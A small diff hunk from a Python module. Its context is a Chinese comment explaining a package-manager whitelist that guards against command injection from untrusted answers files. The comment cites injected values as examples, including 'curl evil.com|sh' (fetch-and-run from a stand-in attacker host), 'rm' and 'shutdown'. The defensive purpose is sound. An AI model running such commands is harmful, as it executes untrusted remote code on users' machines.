@@ -17,7 +17,6 @@ from pathlib import Path
 
 from .errors import HookExecutionError
 
-
 # SE-P1-1: 包管理器白名单 — 防止恶意 answers (--from-answers from untrusted) 注入
 # 任意命令名 (如 pm='rm' / 'curl evil.com|sh' / 'shutdown')。白名单是单一执行源,
 # 与 ae-template.yml choices 一致, 任何添加/删除 PM 须同步更新两端。
